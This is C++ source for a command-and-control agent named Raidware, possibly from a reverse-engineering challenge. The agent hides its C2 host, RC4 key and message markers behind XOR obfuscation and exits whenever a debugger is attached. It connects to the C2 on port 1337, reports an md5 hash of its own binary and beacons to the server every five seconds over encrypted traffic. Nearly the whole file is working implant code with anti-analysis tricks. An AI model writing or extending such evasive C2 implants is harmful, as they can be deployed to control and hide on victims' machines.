/*
    Raidware.cpp
    Author: TheFlash2k
    ---

    Raidware v0.1 TCP Agent - 2019
*/

#include <iostream>
#include <string>
#include <vector>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>

#include "logger.hpp"
#include "rc4.hpp"

const int MAX_KEY_SIZE = 0x6;
char __K[MAX_KEY_SIZE] = { 0x40, 0x90, 0xFF, 0xe0, 0x12, 0xc9 };

unsigned char HOST[] = { 0x28, 0xff, 0x8c, 0x94, 0x3f, 0xf9, 0x71, 0xbe, 0x8d, 0x81, 0x7b, 0xad, 0x37, 0xf1, 0x8d, 0x85, 0x3c, 0xaa, 0x72, 0x90 };
unsigned char KEY[] = { 0x32,0xa4,0xce,0x84,0x65,0xfd,0x32,0xf5,0xa0,0x8b,0x21,0xb0,0x1f,0xf6,0xcf,0x92,0x4d,0xaa,0x70,0xfd,0x92,0xd5, 0x12 };
unsigned char PREPEND[] = { 0x3c,0xec,0xad,0xa1,0x5b,0x8d,0x17,0xd1,0xad,0xa5,0x3f,0x9a,0x2f,0xdd,0x83,0x9c, 0x12 };
unsigned char POSTPEND[] = { 0x3c,0xec,0xad,0xa1,0x5b,0x8d,0x17,0xd1,0xad,0xa5,0x3f,0x8c,0x2f,0xdd,0x83,0x9c, 0x12 };

#define Pong(x, ...) {\
	base(stdout, "\033[36mPONG\033[0m", x, ##__VA_ARGS__)\
}

void do_stuff(unsigned char* x, int _l) {
    for (int i = 0; i < _l; i++) {
        x[i] = x[i] ^ __K[i % MAX_KEY_SIZE];
    }
}

bool debuggerIsAttached() {

    char buf[4096];
    char path[] = {0x6f,0xe0,0x8d,0x8f,0x71,0xe6,0x33,0xf5,0x93,0x86,0x3d,0xba,0x34,0xf1,0x8b,0x95,0x61, 0xc9};
    do_stuff((unsigned char*)path, 18);
    const int status_fd = open(path, O_RDONLY);
    if (status_fd == -1)
        return false;

    const ssize_t num_read = read(status_fd, buf, sizeof(buf) - 1);
    close(status_fd);

    if (num_read <= 0)
        return false;

    buf[num_read] = '\0';
    char tracerPidString[] = {0x14, 0xe2, 0x9e, 0x83, 0x77, 0xbb, 0x10, 0xf9, 0x9b, 0xda, 0x12};
    do_stuff((unsigned char*)tracerPidString, 11);
    const auto tracer_pid_ptr = strstr(buf, tracerPidString);
    if (!tracer_pid_ptr)
        return false;

    for (const char* characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - 1; characterPtr <= buf + num_read; ++characterPtr)
    {
        if (isspace(*characterPtr))
            continue;
        else
            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
    }

    return false;
}

class Socket {
    std::string _host;
    uint16_t _port;

    int _sockfd;

public:
    Socket(std::string host, uint16_t port) : _host(host), _port(port) {
        if(debuggerIsAttached()) exit(0);
        _sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (_sockfd < 0) {
            Error("Failed to create socket");
            exit(1);
        }

        struct hostent *he = gethostbyname(_host.c_str());

        if (he == NULL) {
            Error("Failed to resolve host");
            exit(1);
        }

        host = inet_ntoa(*((struct in_addr *)he->h_addr_list[0]));

        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, host.c_str(), &(sa.sin_addr));

        if (result == 0) {
            Error("Invalid IP address");
            exit(1);
        } else if (result < 0) {
            Error("Failed to convert IP address");
            exit(1);
        }

        sa.sin_family = AF_INET;
        sa.sin_port = htons(_port);

        if (connect(_sockfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            Error("Failed to connect to Raidware C2.");
            exit(1);
        }
        Log("Connected to Raidware C2.");
    }

    ~Socket() {
        close(_sockfd);
    }

    void Send(std::string data) {
        data = (char*)PREPEND + data + (char*)POSTPEND;
        std::vector<unsigned char> encrypted_data(data.begin(), data.end());
        auto ct = crypto::crypt((unsigned char*)KEY, encrypted_data.data());
        if(debuggerIsAttached()) exit(0);
        send(_sockfd, ct, strlen((const char*)ct), 0);
    }

    std::string Recv() {

        std::vector<unsigned char> buffer(1024);
        int bytes = recv(_sockfd, buffer.data(), buffer.size(), 0);

        if (bytes < 0) {
            Error("Failed to receive data from Raidware C2.");
            exit(1);
        }

        std::vector<unsigned char> decrypted_data(buffer.begin(), buffer.begin() + bytes);

        auto _ = crypto::crypt((unsigned char*)KEY, decrypted_data.data());

        auto s = std::string((const char*)_, strlen((const char*)_));

        if(debuggerIsAttached()) exit(0);

        if (s.find((char*)PREPEND) != std::string::npos)
            s.erase(0, strlen((char*)PREPEND));
        if (s.find((char*)POSTPEND) != std::string::npos)
            s.erase(s.find((char*)POSTPEND), strlen((char*)POSTPEND));
        return s;
    }
};

int main(int argc, char* argv[], char* envp[]) {

    if(debuggerIsAttached()) exit(0);

    char msg[] = { 0x13 ,0xe4 ,0x9e ,0x92 ,0x66 ,0xa0 ,0x2e ,0xf7 ,0xdf ,0xb2 ,0x73 ,0xa0 ,0x24 ,0xe7 ,0x9e ,0x92 ,0x77 ,0xe9 ,0x36 ,0xa0 ,0xd1 ,0xd1 ,0x32 ,0x9d ,0x03 ,0xc0 ,0xdf ,0xa1 ,0x75 ,0xac ,0x2e ,0xe4, 0xFF };
    do_stuff((unsigned char*)msg, 33);
    Log(msg);

    do_stuff(HOST, 20);
    do_stuff(KEY, 23);

    do_stuff(PREPEND, 17);
    do_stuff(POSTPEND, 17);

    uint16_t port = 1337;

    char hh[] = { 0x6d, 0xf8, 0xFF };
    char pp[] = { 0x6d, 0xe0, 0xFF };
    do_stuff((unsigned char*)hh, 3);
    do_stuff((unsigned char*)pp, 3);

    if(debuggerIsAttached()) exit(0);

    if(argc >= 2) {
        if(strncmp(argv[1], (char*)hh, 2) == 0) {
            printf("Nope. I patched this one ;0 (or maybe it was there from the start?)");
            return 0;
        }

        if(argc >= 4) {
            if(strncmp(argv[1], (char*)pp, 2) == 0)
                port = atoi(argv[2]);
        }

    }

    if(debuggerIsAttached()) exit(0);

    Socket s((char*)HOST, port);
    char init[] = {0x09,0xde,0xb6,0xb4,0x4d,0x9b,0x01,0xd9,0xbb,0xb7,0x53,0x9b,0x05,0x90};
    do_stuff((unsigned char*)init, 14);
    s.Send(init);
    s.Recv();

    char c[] = {0x2d, 0xf4, 0xca, 0x93, 0x67, 0xa4, 0x60, 0x90 };
    do_stuff((unsigned char*)c, 8);
    std::string cmd = (char*)c;
    cmd += argv[0];
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) {
        exit(1);
    }

    char buffer[128];
    std::string result = "";
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }

    pclose(pipe);
    char ha[] = {0x08,0xf1,0x8c,0x88,0x6e,0xc9};
    do_stuff((unsigned char*)ha, 6);
    std::string md5sum = ha + result.substr(0, result.find(" "));

    s.Send(md5sum);

    auto resp = s.Recv();
    if (resp.find("OK") != std::string::npos) {
        Log("Raidware C2 accepted agent.");
    } else {
        Error("Raidware C2 rejected agent.");
        exit(1);
    }

    while (true) {
        s.Send("PING");
        sleep(5);
        resp = s.Recv();
        if (resp.find("PONG") != std::string::npos) {
            Pong("Received PONG from Raidware C2.");
        } else {
            Error("Failed to receive PONG from Raidware C2.");
            exit(1);
        }
    }

    return 0;
}